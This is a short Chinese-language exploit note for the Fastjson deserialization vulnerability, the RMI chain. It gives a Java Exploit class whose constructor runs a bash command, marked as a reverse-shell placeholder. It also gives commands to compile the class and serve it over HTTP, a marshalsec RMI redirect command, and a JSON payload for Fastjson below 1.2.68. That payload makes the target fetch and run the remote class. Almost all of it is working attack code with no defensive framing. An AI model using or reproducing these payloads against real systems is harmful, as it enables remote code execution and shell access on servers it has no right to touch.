# Fastjson

## 反序列化漏洞

RMI链

```
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Exploit{
    public Exploit() throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", "反弹shell命令"});
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}

```

javac Exploit.java

开启一个http服务，需要能访问到Exploit.class文件

```
python3 -m http.server --bind 0.0.0.0 8888
```

RMI to HTTP

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://1.1.1.1:8888/#Exploit" 9999
```

### <1.2.68

```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://x.x.IP.x:9999/Exploit",
        "autoCommit":true
    }
}
```

